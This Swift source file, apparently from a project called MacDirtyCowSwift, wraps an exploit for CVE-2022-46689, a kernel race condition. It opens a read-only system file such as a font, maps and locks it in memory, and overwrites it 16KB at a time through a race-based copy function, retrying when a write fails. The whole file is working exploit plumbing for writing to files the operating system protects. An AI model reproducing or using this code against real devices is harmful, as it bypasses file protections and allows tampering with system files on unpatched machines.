//
//  Wrappers.swift
//  MacDirtyCowSwift
//
//  Created by sourcelocation on 08/02/2023.
//

import Foundation

// Overwrite the system font with the given font using CVE-2022-46689.
// The font must be specially prepared so that it skips past the last byte in every 16KB page.
// See BrotliPadding.swift for an implementation that adds this padding to WOFF2 fonts.
// credit: FontOverwrite

/// unlockDataAtEnd - Unlocked the data at overwrite end. Used when replacing files inside app bundle
public func overwriteFileWithDataImpl(originPath: String, replacementData: Data, unlockDataAtEnd: Bool = true) throws {
#if false
    let documentDirectory = FileManager.default.urls(
        for: .documentDirectory,
        in: .userDomainMask
    )[0].path
    
    let pathToRealTarget = originPath
    let originPath = documentDirectory + originPath
    let origData = try! Data(contentsOf: URL(fileURLWithPath: pathToRealTarget))
    try! origData.write(to: URL(fileURLWithPath: originPath))
#endif
    
    // open and map original font
    let fd = open(originPath, O_RDONLY | O_CLOEXEC)
    if fd == -1 {
        NSLog("Could not open target file")
        throw("Could not open target file")
    }
    defer { close(fd) }
    // check size of font
    let originalFileSize = lseek(fd, 0, SEEK_END)
    guard originalFileSize >= replacementData.count else {
        NSLog("Original file: \(originalFileSize)")
        NSLog("Replacement file: \(replacementData.count)")
        NSLog("File too big")
        throw "File too big!\nOriginal file: \(originalFileSize)\nReplacement file: \(replacementData.count)"
    }
    lseek(fd, 0, SEEK_SET)
    
    // Map the font we want to overwrite so we can mlock it
    let fileMap = mmap(nil, replacementData.count, PROT_READ, MAP_SHARED, fd, 0)
    if fileMap == MAP_FAILED {
        NSLog("Failed to map")
        throw "Failed to map"
    }
    // mlock so the file gets cached in memory
    guard mlock(fileMap, replacementData.count) == 0 else {
        NSLog("Failed to mlock")
        throw "Failed to mlock"
    }
    
    // for every 16k chunk, rewrite
    NSLog("%@", "\(Date())")
    for chunkOff in stride(from: 0, to: replacementData.count, by: 0x4000) {
//        NSLog(String(format: "%lx", chunkOff))
        let dataChunk = replacementData[chunkOff..<min(replacementData.count, chunkOff + 0x4000)]
        var overwroteOne = false
        for _ in 0..<2 {
            let overwriteSucceeded = dataChunk.withUnsafeBytes { dataChunkBytes in
                return unaligned_copy_switch_race(
                    fd, Int64(chunkOff), dataChunkBytes.baseAddress, dataChunkBytes.count, unlockDataAtEnd)
            }
            if overwriteSucceeded {
                overwroteOne = true
                break
            }
            NSLog("try again?!")
        }
        guard overwroteOne else {
            NSLog("Failed to overwrite")
            throw "Failed to overwrite"
        }
    }
    NSLog("%@", "\(Date())")
    
    if unlockDataAtEnd {
        guard munlock(fileMap, replacementData.count) == 0 else {
            NSLog("Failed to munlock")
            return
        }
    }
}
